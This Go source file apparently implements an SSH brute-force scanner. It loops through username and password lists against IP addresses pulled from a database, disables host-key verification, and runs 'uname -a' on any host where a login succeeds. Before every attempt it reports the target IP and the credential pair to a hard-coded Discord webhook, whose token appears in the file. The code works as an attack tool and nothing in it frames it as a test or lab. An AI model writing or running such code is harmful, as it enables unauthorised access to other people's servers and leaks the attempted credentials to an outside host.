package pkg

import (
	"fmt"
	"playGO/cmd"
	"playGO/handler"
	"playGO/util"
	"time"

	"golang.org/x/crypto/ssh"
)

func SSHClient(ip string, port int, username string, password string) error {
	sshCFG := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}
	println("SSH client Connecting to", ip, "on port", port, "with username", username, "and password", password)
	address := fmt.Sprintf("%s:%d", ip, port)
	client, err := ssh.Dial("tcp", address, sshCFG)
	if err != nil {
		println("Error connecting to SSH server:", err.Error())
		return nil
	}
	defer client.Close()
	session, err := client.NewSession()
	if err != nil {
		println("Error creating SSH session:", err.Error())
		return nil
	}
	defer session.Close()
	output, err := session.CombinedOutput("uname -a")
	if err != nil {
		println("Error executing command:", err.Error())
		return nil
	}
	println("Command output:", string(output))
	return nil

}

func ConnectToServer(port int) {
	usernames, err := handler.LoadUsernames()
	if err != nil {
		println("Error loading username file:", err.Error())
		return
	}
	fmt.Println("Loaded usernames:", usernames)
	passwords, err := handler.LoadPasswords()
	if err != nil {
		println("Error loading passwords:", err.Error())
		return
	}
	fmt.Println("Loaded passwords:", passwords)
	allIpsInDB, err := util.GetSSHIPFromDB()
	if err != nil {
		println("Error getting IPs from database:", err.Error())
		return
	}
	fmt.Println("Loaded IPs from database:", allIpsInDB)
	for _, username := range usernames {
		for _, password := range passwords {
			for _, ip := range allIpsInDB {
				println("Connecting to", ip, "on port", port, "with username", username, "and password", password)
				webhook := "https://discord.com/api/webhooks/1356857871215890452/TUSPalcrGvLv6urWFtTM4mbxHNR34wYeMPwu40nmZjxz3_elHiIlboGfvafO5Ng4OMMm"
				cmd.SendWebhookMessage(webhook, fmt.Sprintf("Connecting to %s on port %d with username %s and password %s", ip, port, username, password))
				err := SSHClient(ip, port, username, password)
				if err != nil {
					println("Error connecting to SSH server:", err.Error())
					util.AddChecked(ip)
					return
				}
				check, err := util.IsIPChecked(ip)
				if err != nil {
					println("Error checking IP:", err.Error())
					return
				}
				if check {
					println("IP is already checked on port 22:", ip)
					continue
				}
				util.AddChecked(ip)
				println("IP is checked:", ip)
				cpuPercent, err := util.MonitorCPU()
				if err != nil {
					println("Error getting CPU percent:", err.Error())
					return
				}
				if cpuPercent > 80 {
					println("CPU usage is high:", fmt.Sprintf("%.2f%%", cpuPercent))
					println("Sleeping for 3 seconds")
					time.Sleep(3 * time.Second)
				} else {
					println("CPU usage is normal:", fmt.Sprintf("%.2f%%", cpuPercent))
				}
			}
			fmt.Println("SSH connection attempt finished")
		}
	}
}
